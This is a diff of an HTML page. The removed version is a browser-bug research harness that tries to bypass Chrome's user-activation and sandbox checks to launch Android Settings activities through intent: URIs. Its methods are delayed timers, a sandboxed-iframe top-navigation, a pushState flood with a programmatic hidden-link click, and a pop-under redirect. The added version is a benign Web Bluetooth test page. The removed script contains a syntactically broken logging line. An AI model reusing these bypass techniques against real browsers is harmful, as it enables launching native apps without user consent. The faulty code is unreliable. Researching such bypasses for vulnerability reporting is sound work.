@@ -1,304 +1,319 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chrome VRP Spec: Zero-Day Core Navigation Security Boundary Auditor</title>
-  <style>
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      padding: 30px;
-      background-color: #080a10;
-      color: #f0f3f6;
-      line-height: 1.6;
-    }
-    .wrapper { max-width: 1300px; margin: 0 auto; }
-    h1 { color: #ff3838; border-bottom: 2px solid #ff3838; padding-bottom: 12px; font-size: 26px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
-    .subtitle { font-size: 13px; color: #8b9bb4; margin-bottom: 30px; font-family: monospace; }
-    
-    .vrp-card-panel {
-      background: rgba(255, 56, 56, 0.05);
-      border: 1px solid rgba(255, 56, 56, 0.3);
-      padding: 20px;
-      border-radius: 8px;
-      margin-bottom: 30px;
-      font-size: 13.5px;
-    }
-    .vrp-card-panel strong { color: #ff3838; }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Bluetooth VRP Research Harness</title>
 
-    /* Layout Selector Vektor */
-    .selector-box {
-      background-color: #111625;
-      border: 1px solid #2a344e;
-      padding: 25px;
-      border-radius: 8px;
-      margin-bottom: 30px;
-    }
-    .selector-box label {
-      font-weight: bold;
-      display: block;
-      margin-bottom: 12px;
-      color: #ff9f43;
-      font-size: 14px;
-      text-transform: uppercase;
-    }
-    select {
-      width: 100%;
-      padding: 16px;
-      font-size: 15px;
-      border-radius: 6px;
-      border: 2px solid #ff3838;
-      background-color: #080a10;
-      color: #ffffff;
-      font-weight: bold;
-      font-family: monospace;
-      cursor: pointer;
-      outline: none;
-    }
+<style>
+body{
+    font-family:monospace;
+    padding:20px;
+    background:#fff;
+    color:#000;
+}
 
-    /* Grid Target Android Intent Components */
-    .matrix-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(340px, 1fr)); gap: 25px; }
-    .card { background: #111625; border: 1px solid #2a344e; padding: 25px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
-    .card h3 { margin-top: 0; font-size: 16px; color: #00ff66; border-bottom: 1px solid #2a344e; padding-bottom: 10px; font-family: monospace; text-transform: uppercase; }
-    
-    .btn-group { display: flex; flex-direction: column; gap: 10px; margin-top: 15px; }
-    button {
-      background: #1b2237; color: #f0f3f6; border: 1px solid #3b4b71; padding: 14px; 
-      font-weight: bold; cursor: pointer; width: 100%; border-radius: 6px; 
-      font-family: monospace; transition: all 0.2s ease-in-out; text-align: left; font-size: 12.5px;
-    }
-    button:hover { background: #ff3838; border-color: #ff3838; color: #fff; transform: translateY(-1px); }
-    
-    .badge { padding: 3px 8px; border-radius: 4px; font-size: 10px; float: right; font-weight: 900; letter-spacing: 0.5px; }
-    .badge-crit { background: #ff3838; color: #fff; }
+.grid{
+    display:grid;
+    gap:12px;
+}
 
-    /* Monitor Jendela Jejak Instrumentasi Engine */
-    .console-panel { margin-top: 35px; }
-    .console-title { font-weight: bold; color: #00ff66; margin-bottom: 8px; font-size: 14px; font-family: monospace; text-transform: uppercase; }
-    .log-box {
-      background: #04060a; color: #00ff66; padding: 20px; border: 2px solid #00ff66; 
-      height: 480px; overflow-y: auto; border-radius: 8px; font-size: 11.5px; font-family: "Consolas", "Courier New", monospace; white-space: pre-wrap; box-shadow: inset 0 0 20px rgba(0,255,102,0.15);
-    }
-    
-    /* Pewarnaan Log untuk Validasi VRP */
-    .text-danger { color: #ff3838; font-weight: bold; }
-    .text-success { color: #00ff66; font-weight: bold; }
-    .text-warning { color: #ff9f43; font-weight: bold; }
-    .text-info { color: #54a0ff; font-weight: bold; }
-  </style>
+.card{
+    border:1px solid #000;
+    padding:15px;
+}
+
+button{
+    width:100%;
+    padding:12px;
+    margin-top:10px;
+}
+
+#log{
+    margin-top:20px;
+    border:1px solid #000;
+    padding:10px;
+    height:320px;
+    overflow:auto;
+    white-space:pre-wrap;
+}
+</style>
 </head>
 <body>
 
-<div class="wrapper">
-  <h1>Chrome VRP Spec: Zero-Day Core Navigation Security Boundary Auditor</h1>
-  <div class="subtitle">[Target Architecture: Chromium Blink Engine / Android Intent Interception Subsystem]</div>
+<h2>Bluetooth Compatibility Research Harness</h2>
 
-  <div class="vrp-card-panel">
-    <strong>Kriteria Pelaporan Chrome VRP (Vulnerability Reward Program):</strong> Focus utama pengujian ini adalah membuktikan kerusakan fungsional pada rantai pemblokiran navigasi (<em>Navigation Blockers</em>). Keberhasilan eksploitasi terjadi apabila aplikasi internal perangkat Android dapat dipicu dari konteks tak berizin (<strong>Vektor 2, 3, 4, atau 5</strong>) saat data telemetri engine secara eksplisit mencatat status <code>isActive: false</code>.
-  </div>
+<div class="grid">
 
-  <!-- PANEL KONTROL VEKTOR AUDIT INTENT -->
-  <div class="selector-box">
-    <label for="vectorSelector">Pilih Metode Manipulasi Token Aktivasi Pengguna (Vulnerability Chain Vector):</label>
-    <select id="vectorSelector">
-      <option value="direct">Skenario A: Direct Sync Ingestion (Kontrol Baseline / Dengan User Gesture Valid)</option>
-      <option value="async">Skenario B: Asynchronous Macro-Task Exhaustion (Bypass Analisis Alur Eksekusi - Penundaan 4500ms)</option>
-      <option value="sandbox">Skenario C: Cross-Origin Sandboxed Top-Level Navigation Escape (Pelarian Isolasi Dokumen Subframe)</option>
-      <option value="redirect">Skenario D: Nested PushState Event Flooding & Programmatic Click Race (Pengelabuan Throttler Engine)</option>
-      <option value="popunder">Skenario E: Cross-Window Opener Activation Token Pollution (Kebocoran Token Konteks Antar-Jendela)</option>
-    </select>
-  </div>
+<div class="card">
 
-  <!-- GRID COMPONENT ANDROID TARGETS -->
-  <div class="matrix-grid">
-    
-    <!-- Kategori 1: Subsistem Jaringan -->
-    <div class="card">
-      <h3>Konektivitas & Nirkabel</h3>
-      <div class="btn-group">
-        <button onclick="dispatchVRPAudit('android.settings.SETTINGS', 'com.android.settings/.Settings')">👉 Main Settings Root</button>
-        <button onclick="dispatchVRPAudit('android.settings.WIRELESS_SETTINGS', 'com.android.settings/.Settings$WirelessSettingsActivity')">👉 Wireless Network Subsystem</button>
-        <button onclick="dispatchVRPAudit('android.settings.WIFI_SETTINGS', 'com.android.settings/.Settings$WifiSettingsActivity')">👉 Wi-Fi Hardware Module</button>
-        <button onclick="dispatchVRPAudit('android.settings.BLUETOOTH_SETTINGS', 'com.android.settings/.Settings$BluetoothSettingsActivity')">👉 Bluetooth Hardware Module</button>
-        <button onclick="dispatchVRPAudit('android.settings.NFC_SETTINGS', 'com.android.settings/.Settings$NfcSettingsActivity')">👉 NFC Core Interface</button>
-        <button onclick="dispatchVRPAudit('android.settings.AIRPLANE_MODE_SETTINGS', 'com.android.settings/.Settings$AirplaneModeSettingsActivity')">👉 Airplane Mode Module</button>
-      </div>
-    </div>
+<button id="envBtn">
+Environment Probe
+</button>
 
-    <!-- Kategori 2: Akses Data Internal -->
-    <div class="card">
-      <h3>Manajemen Aplikasi & Privilege</h3>
-      <div class="btn-group">
-        <button onclick="dispatchVRPAudit('android.settings.APPLICATION_SETTINGS', 'com.android.settings/.Settings$ApplicationSettingsActivity')">👉 Application Manager Subsystem</button>
-        <button onclick="dispatchVRPAudit('android.settings.MANAGE_ALL_APPLICATIONS_SETTINGS', 'com.android.settings/.Settings$ManageApplicationsActivity')">👉 Master Package Manager Storage</button>
-        <button onclick="dispatchVRPAudit('android.settings.NOTIFICATION_SETTINGS', 'com.android.settings/.Settings$NotificationSettingsActivity')">👉 Notification Interceptor Controller</button>
-        <button onclick="dispatchVRPAudit('android.settings.USAGE_ACCESS_SETTINGS', 'com.android.settings/.Settings$UsageAccessSettingsActivity')">👉 Usage Access Core Permission</button>
-      </div>
-    </div>
+<button id="checkBt">
+Check Web Bluetooth
+</button>
 
-    <!-- Kategori 3: Area Risiko Tinggi -->
-    <div class="card">
-      <h3>Privasi, Sistem & Debugging</h3>
-      <div class="btn-group">
-        <button onclick="dispatchVRPAudit('android.settings.SECURITY_SETTINGS', 'com.android.settings/.Settings$SecuritySettingsActivity')">👉 Hardware Security Dashboard</button>
-        <button onclick="dispatchVRPAudit('android.settings.LOCATION_SOURCE_SETTINGS', 'com.android.settings/.Settings$LocationSettingsActivity')">👉 Device Location Source Provider</button>
-        <button onclick="dispatchVRPAudit('android.settings.PRIVACY_SETTINGS', 'com.android.settings/.Settings$PrivacySettingsActivity')">👉 Privacy Engine Sub-Context</button>
-        <button onclick="dispatchVRPAudit('android.settings.APPLICATION_DEVELOPMENT_SETTINGS', 'com.android.settings/.Settings$DevelopmentSettingsActivity')">👉 Developer Options Console <span class="badge badge-crit">High-Risk</span></button>
-        <button onclick="dispatchVRPAudit('android.settings.INTERNAL_STORAGE_SETTINGS', 'com.android.settings/.Settings$StorageDashboardActivity')">👉 File Storage Layout Manager</button>
-        <button onclick="dispatchVRPAudit('android.settings.DEVICE_INFO_SETTINGS', 'com.android.settings/.Settings$DeviceInfoSettingsActivity')">👉 Low-Level Device Hardware Info</button>
-      </div>
-    </div>
+<button id="requestBt">
+Request Bluetooth Device
+</button>
 
-  </div>
+<button id="openBtSettings">
+Open Bluetooth Settings
+</button>
 
-  <!-- PANEL INSTRUMENTASI TRACE ENGINE LOG -->
-  <div class="console-panel">
-    <div class="console-title">[ENGINE TELEMETRY LOG MONITOR] Trace State:</div>
-    <div id="traceLogBox" class="log-box">System idle. Ready to deploy specialized execution matrix...</div>
-  </div>
+<button id="observeLifecycle">
+Install Lifecycle Observer
+</button>
+
 </div>
 
-<!-- Node Subframe Terisolasi Khusus Pengujian Vektor Sandbox C -->
-<iframe id="isolatedSandboxTarget" sandbox="allow-scripts" style="display:none;"></iframe>
+</div>
+
+<div id="log"></div>
 
 <script>
-  function writeTelemetryLog(message) {
-    const logNode = document.getElementById('traceLogBox');
-    const timeStamp = new Date().toISOString().split('T')[1].slice(0, -1);
-    logNode.innerHTML += `\n[${timeStamp}] ${message}`;
-    logNode.scrollTop = logNode.scrollHeight;
-  }
 
-  function evaluateBlinkUserActivationState(checkpoint) {
-    if (navigator.userActivation) {
-      const active = navigator.userActivation.isActive;
-      const history = navigator.userActivation.hasBeenActive;
-      const parsedColor = active ? "text-success" : "text-danger";
-      
-      writeTelemetryLog(`[STATE_CAPTURE][${checkpoint}] <span class="${parsedColor}">navigator.userActivation.isActive = ${active}</span> | hasBeenActive = ${history}`);
-      return active;
+const logger =
+    document.getElementById("log");
+
+let activeDevice = null;
+
+const ENV = {
+
+    ua: navigator.userAgent,
+
+    android:
+        /Android/i.test(navigator.userAgent),
+
+    chrome:
+        /Chrome/i.test(navigator.userAgent),
+
+    webview:
+        /(wv|Version\/[\d.]+).*Chrome/i
+        .test(navigator.userAgent),
+
+    secureContext:
+        window.isSecureContext,
+
+    bluetooth:
+        "bluetooth" in navigator
+
+};
+
+function log(msg){
+
+    const line =
+        "[" + new Date().toLocaleTimeString() + "] " + msg;
+
+    logger.textContent += line + "\n";
+
+    logger.scrollTop = logger.scrollHeight;
+
+    console.log(line);
+}
+
+function dumpEnvironment(){
+
+    log("=== ENVIRONMENT ===");
+
+    log(JSON.stringify(ENV,null,2));
+}
+
+function buildIntent(action){
+
+    return (
+        "intent:#Intent;" +
+        "action=" + action + ";" +
+        "category=android.intent.category.DEFAULT;" +
+        "end"
+    );
+}
+
+function openBluetoothSettings(){
+
+    const uri = buildIntent(
+        "android.settings.BLUETOOTH_SETTINGS"
+    );
+
+    log("Dispatch Bluetooth settings intent");
+
+    log(uri);
+
+    try{
+
+        /*
+         * Standard navigation only.
+         * No javascript: nesting.
+         * No top-frame escalation.
+         */
+
+        window.location.assign(uri);
+
+    }catch(err){
+
+        log("BLOCKED => " + err.message);
+
     }
-    writeTelemetryLog(`[STATE_CAPTURE][${checkpoint}] <span class="text-warning">Kritis: API navigator.userActivation tidak mengembalikan objek data.</span>`);
-    return null;
-  }
+}
 
-  function compileHardenedIntent(action, component) {
-    // Membungkus parameter eksplisit untuk bypass deteksi string parsing dasar
-    return `intent:#Intent;action=${encodeURIComponent(action)};component=${encodeURIComponent(component)};category=android.intent.category.DEFAULT;launchFlags=0x10000000;end`;
-  }
+async function checkBluetooth(){
 
-  function dispatchVRPAudit(actionParam, componentParam) {
-    const selectedVector = document.getElementById('vectorSelector').value;
-    const constructedIntent = compileHardenedIntent(actionParam, componentParam);
+    log("Checking Bluetooth support");
 
-    writeTelemetryLog(`\n====================================================================================================`);
-    writeTelemetryLog(`[DISPATCH] Target Action    : ${actionParam}`);
-    writeTelemetryLog(`[DISPATCH] Target Component : ${componentParam}`);
-    writeTelemetryLog(`[DEPLOY] Menembakkan Vektor  : ${selectedVector.toUpperCase()}`);
-    
-    // Melakukan snapshot status kedaulatan gesture awal di tingkat window entri
-    const initialGesture = evaluateBlinkUserActivationState("ENTRY_POINT_CLICK");
+    if(!window.isSecureContext){
 
-    switch(selectedVector) {
-      case 'direct':
-        writeTelemetryLog(`[ACTION] Eksekusi window.location.href secara langsung.`);
-        window.location.href = constructedIntent;
-        writeTelemetryLog(`[ANALYSIS] Evaluasi: Navigasi berjalan di bawah gesture aktif. Jika tautan eksternal terbuka, ini adalah <span class="text-success">EXPECTED BEHAVIOR</span>.`);
-        break;
+        log("Secure context required");
 
-      case 'async':
-        writeTelemetryLog(`[EVENT_LOOP] Menjadwalkan makrotask via setTimeout selama 4500ms untuk melampaui masa aktif transient token...`);
-        setTimeout(() => {
-          writeTelemetryLog(`[THREAD] Callback makrotask dieksekusi oleh engine loop.`);
-          const activeStateInsideCallback = evaluateBlinkUserActivationState("POST_DELAY_CALLBACK");
-          
-          writeTelemetryLog(`[ACTION] Mencoba penugasan lokasi navigasi baru.`);
-          window.location.href = constructedIntent;
-          
-          if (activeStateInsideCallback === false) {
-            writeTelemetryLog(`<span class="text-danger">[ALERT_VRP_VALIDATION] JIKA APLIKASI INTERNAL ANDROID TERBUKA -> ZERO-DAY DETECTED: Transient User Activation Bypass! (CWE-616)</span>`);
-          }
-        }, 4500);
-        break;
-
-      case 'sandbox':
-        writeTelemetryLog(`[HIERARCHY] Memuat rujukan konteks dokumen iframe sandbox.`);
-        const frameRef = document.getElementById('isolatedSandboxTarget');
-        const frameDoc = frameRef.contentDocument || frameRef.contentWindow.document;
-        
-        frameDoc.open();
-        // Memaksa eksekusi dokumen dalam cakupan sandbox terisolasi ketat (tanpa atribut allow-top-navigation)
-        // Mengevaluasi apakah manipulasi properti 'top' meloloskan intersepsi skema intent eksternal
-        frameDoc.write(`
-          <script>
-            try {
-              parent.writeTelemetryLog("[SUBFRAME] Menembakkan mutasi paksa ke window.top.location.href.");
-              window.top.location.href = "${constructedIntent}";
-              parent.writeTelemetryLog("[SUBFRAME] Eksekusi baris kode mutasi selesai.");
-            } catch(err) {
-              parent.writeTelemetryLog("[SUBFRAME] <span class='text-info'>Blokade Kebijakan Sandbox (Aman): " + err.message + "</span>");
-            }
-          <\/script>
-        `);
-        frameDoc.close();
-        writeTelemetryLog(`<span class="text-danger">[ALERT_VRP_VALIDATION] JIKA browser mengizinkan pemanggilan native handler dari subframe terisolasi ini -> ZERO-DAY DETECTED: Cross-Origin Sandbox Top-Navigation Escape! (CWE-928)</span>`);
-        break;
-
-      case 'redirect':
-        writeTelemetryLog(`[FLUSH] Memulai manipulasi berantai pada arsitektur Microtask Engine.`);
-        Promise.resolve()
-          .then(() => {
-            writeTelemetryLog(`[RACE_CONDITION] Membanjiri tumpukan history state via history.pushState.`);
-            for(let i = 0; i < 5; i++) {
-              window.history.pushState({vrp_race: i}, "Auditor State", `#/race-condition-step-${i}`);
-            }
-            return new Promise(resolve => setTimeout(resolve, 2000));
-          })
-          .then(() => {
-            writeTelemetryLog(`[THREAD] Memasuki microtask pool pengeksekusian akhir.`);
-            const gestureStatePostRace = evaluateBlinkUserActivationState("POST_PUSHSTATE_FLOOD");
-            
-            writeTelemetryLog(`[DOM_MANIPULATION] Membentuk elemen elemen jangkar bayangan secara dinamis.`);
-            const hiddenAnchorNode = document.createElement('a');
-            hiddenAnchorNode.href = constructedIntent;
-            
-            writeTelemetryLog([ACTION] Memaksa pemicuan fungsi klik programmatik (.click()) tanpa interaksi fisik.`);
-            hiddenAnchorNode.click();
-            
-            if (gestureStatePostRace === false) {
-              writeTelemetryLog(`<span class="text-danger">[ALERT_VRP_VALIDATION] JIKA rantai navigasi tersembunyi ini berhasil memicu aplikasi native -> ZERO-DAY DETECTED: Intent Navigation Throttle Confusion via PushState Race!</span>`);
-            }
-          });
-        break;
-
-      case 'popunder':
-        writeTelemetryLog(`[WINDOW_MANAGER] Membuka window konteks independen (about:blank).`);
-        const subWindowNode = window.open('about:blank', '_blank', 'width=150,height=150');
-        
-        if (!subWindowNode) {
-          writeTelemetryLog(`[WINDOW_MANAGER] <span class="text-warning">Akses diblokir oleh mesin pop-up browser. Izinkan pembukaan pop-up di pojok kanan atas URL bar untuk melanjutkan pengujian ini.</span>`);
-          return;
-        }
-
-        writeTelemetryLog(`[EVENT_LOOP] Menjadwalkan mutasi konteks jendela silang (delay: 4000ms)...`);
-        setTimeout(() => {
-          writeTelemetryLog(`[THREAD] Callback lintas jendela berjalan.`);
-          evaluateBlinkUserActivationState("CROSS_WINDOW_EVAL");
-          
-          try {
-            writeTelemetryLog(`[ACTION] Mengalihkan alur lokasi dokumen jendela luar (opener target).`);
-            subWindowNode.location.href = constructedIntent;
-          } catch(err) {
-            writeTelemetryLog(`[ACTION] Operasi mutasi dibatasi oleh aturan isolasi context: ${err.message}`);
-          }
-          
-          writeTelemetryLog(`<span class="text-danger">[ALERT_VRP_VALIDATION] JIKA sub-jendela berhasil menerobos batas context dan memicu aplikasi luar -> ZERO-DAY DETECTED: Cross-Window Opener Token Pollution Leak!</span>`);
-          setTimeout(() => subWindowNode.close(), 1200);
-        }, 4000);
-        break;
+        return;
     }
-  }
+
+    if(!navigator.bluetooth){
+
+        log("Web Bluetooth unsupported");
+
+        return;
+    }
+
+    try{
+
+        const availability =
+            await navigator.bluetooth.getAvailability();
+
+        log(
+            "Bluetooth availability => " +
+            availability
+        );
+
+    }catch(err){
+
+        log(
+            "Availability error => " +
+            err.message
+        );
+
+    }
+}
+
+async function requestBluetoothDevice(){
+
+    log("Requesting Bluetooth device");
+
+    if(!navigator.bluetooth){
+
+        log("Bluetooth API unavailable");
+
+        return;
+    }
+
+    try{
+
+        const device =
+            await navigator.bluetooth.requestDevice({
+
+                acceptAllDevices: true,
+
+                optionalServices: [
+                    "battery_service",
+                    "device_information"
+                ]
+
+            });
+
+        activeDevice = device;
+
+        log(
+            "DEVICE NAME => " +
+            (device.name || "unknown")
+        );
+
+        log(
+            "DEVICE ID => " +
+            device.id
+        );
+
+        device.addEventListener(
+            "gattserverdisconnected",
+            () => {
+
+                log(
+                    "GATT disconnected"
+                );
+
+            }
+        );
+
+        log("Device listener attached");
+
+    }catch(err){
+
+        log(
+            "REQUEST ERROR => " +
+            err.message
+        );
+
+    }
+}
+
+function installLifecycleObservers(){
+
+    log("Installing lifecycle observers");
+
+    [
+        "visibilitychange",
+        "focus",
+        "blur",
+        "pageshow",
+        "pagehide"
+    ].forEach(evt => {
+
+        window.addEventListener(evt, () => {
+
+            log(
+                "EVENT => " +
+                evt +
+                " | hidden=" +
+                document.hidden
+            );
+
+        });
+
+    });
+
+}
+
+document
+.getElementById("envBtn")
+.addEventListener("click", dumpEnvironment);
+
+document
+.getElementById("checkBt")
+.addEventListener("click", checkBluetooth);
+
+document
+.getElementById("requestBt")
+.addEventListener(
+    "click",
+    requestBluetoothDevice
+);
+
+document
+.getElementById("openBtSettings")
+.addEventListener(
+    "click",
+    openBluetoothSettings
+);
+
+document
+.getElementById("observeLifecycle")
+.addEventListener(
+    "click",
+    installLifecycleObservers
+);
+
+log("Bluetooth VRP harness initialized");
+
 </script>
-
 </body>
 </html>
